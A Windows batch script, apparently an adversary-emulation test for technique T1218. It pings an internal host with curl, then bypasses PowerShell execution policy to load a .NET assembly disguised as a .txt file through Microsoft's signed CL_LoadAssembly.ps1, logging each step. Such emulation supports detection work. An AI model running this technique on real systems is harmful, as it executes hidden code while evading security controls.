@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9442\7d167f1c
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9442-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=expressvp.txt
SET ewjmdkff=9442
SET yvwul=%APPDATA%\!pudaazx!\macula-simulations.log
SET nkoi=%APPDATA%\!pudaazx!
SET jzfs=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\CL_LoadAssembly.ps1
SET mrvr=0
SET rnxn=
SET pxnk=T1218
SET unvd=Signed Binary Proxy Execution

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=curl >> "!yvwul!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=!ERRORLEVEL! >> "!yvwul!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: directory_change=!nkoi! >> "!yvwul!" 2>nul
cd /d "!nkoi!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_load_start=!syjfr! >> "!yvwul!" 2>nul
powershell.exe -ep bypass -command "import-module '!jzfs!'; LoadAssemblyFromPath '!pjkcpgw!\!syjfr!'; [Program]::Dale()"
IF !ERRORLEVEL! EQU 0 (SET mrvr=1) ELSE (SET mrvr=0&SET rnxn=assembly_load_failed)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_load_complete=!ERRORLEVEL! >> "!yvwul!" 2>nul

echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!pxnk!|!unvd!=!mrvr!:!rnxn!>> "!yvwul!" 2>nul
ENDLOCAL